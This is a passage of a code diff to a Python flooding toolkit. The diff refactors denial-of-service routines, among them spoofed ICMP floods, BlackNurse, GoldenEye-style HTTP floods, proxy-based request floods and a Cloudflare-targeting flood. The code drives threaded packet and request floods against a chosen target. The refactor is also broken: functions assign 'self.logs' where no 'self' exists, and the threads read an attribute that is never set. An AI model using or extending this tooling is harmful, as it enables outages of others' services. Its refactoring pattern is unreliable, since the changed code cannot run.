         #print("Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
    except Exception as e:
     pass
-   time.sleep(self.speed)
-  self.speed=None
+   time.sleep(self.interval)
+  self.interval=None
   self.target=None
   self.port=None
   self.minttl=None
@@ -3347,8 +3080,8 @@ def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1
  stop=False
  global ip_seg
  ip_seg=ip_range
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -3397,7 +3130,7 @@ class blnu(threading.Thread):
  def run(self):
   global blacknurse_counter
   self.target=target
-  self.speed=speed
+  self.interval=speed
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
@@ -3415,15 +3148,15 @@ class blnu(threading.Thread):
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
     blacknurse_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rPackets sent: {} | IP: {}  ".format(blacknurse_counter,sip))
         sys.stdout.flush()
         #print ("Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
    except Exception as e:
     pass
-   time.sleep(self.speed)
+   time.sleep(self.interval)
   self.target=None
-  self.speed=None
+  self.interval=None
   self.port=None
   self.minttl=None
   self.maxttl=None
@@ -3443,8 +3176,8 @@ def blacknurse(u,p=80,limiting=True,interval=0.1,ip_range=None,min_ttl=64,max_tt
  stop=False
  global ip_seg
  ip_seg=ip_range
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global port
@@ -3564,7 +3297,7 @@ class gldn(threading.Thread):
     if stop==True:
         break
     goldeneye_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Type: {}  ".format(goldeneye_counter,req))
         sys.stdout.flush()
         #print("Requests: {} | Type: {}".format(goldeneye_counter,req))
@@ -3592,8 +3325,8 @@ def goldeneye(u,p=80,threads=700,flood_method=3,timeout=5,duration=60,logs=True,
  goldeneye_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global method
@@ -3757,7 +3490,7 @@ class dosecl(threading.Thread):
     if stop==True:
         break
     doser_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Type: {}  ".format(doser_counter,req))
         sys.stdout.flush()
         #print("Requests: {} | Type: {}".format(doser_counter,req))
@@ -3765,7 +3498,7 @@ class dosecl(threading.Thread):
     if stop==True:
         break
     doser_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Type: {}  ".format(doser_counter,req))
         sys.stdout.flush()
         #print("Requests: {} | Type: {}  ".format(doser_counter,req))
@@ -3789,8 +3522,8 @@ def doser(u,threads=700,flood_method=1,timeout=5,duration=60,logs=True,returning
  tor=set_tor
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global method
@@ -3903,7 +3636,7 @@ class prdose(threading.Thread):
     if stop==True:
         break
     proxdoser_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Type: {} | Bot: {}  ".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
         sys.stdout.flush()
         #print("Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
@@ -3911,7 +3644,7 @@ class prdose(threading.Thread):
     if stop==True:
         break
     proxdoser_counter+=1
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rRequests: {} | Type: {} | Bot: {}  ".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
         sys.stdout.flush()
    except Exception as e:
@@ -3931,8 +3664,8 @@ def prox_doser(u,scraping_timeout=15,threads=700,http_list=None,flood_method=1,t
  proxdoser_counter=0
  global stop
  stop=False
- global prints
- prints=logs
+ 
+ self.logs=logs
  global target
  target=u
  global method
@@ -4019,7 +3752,7 @@ class atcf(threading.Thread):
      try:
       req=urllib2.urlopen(request,timeout=self.timeout)            
       cf_doser_counter+=1
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
         sys.stdout.flush()
         #print("Requests: {}".format(cf_doser_counter))
@@ -4028,14 +3761,14 @@ class atcf(threading.Thread):
        stop=True
        break
       cf_doser_counter+=1
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
         sys.stdout.flush()
         #print("Requests: {}".format(cf_doser_counter))
      except Exception as e:
       if "The read operation timed out" in str(e):
        cf_doser_counter+=1
-       if prints==True:
+       if self.logs==True:
         sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
         sys.stdout.flush()
         #print("Requests: {}".format(cf_doser_counter))
@@ -4091,10 +3824,10 @@ def cf_kill_ua(u,threads=500,timeout=5,check_ua_protection=True,need_cookie=Fals
  thr=[]
  global cf_doser_counter
  cf_doser_counter=0
- global prints
+ 
  global stop
  stop=False
- prints=logs
+ self.logs=logs
  global _timeout
  _timeout=timeout
  global target
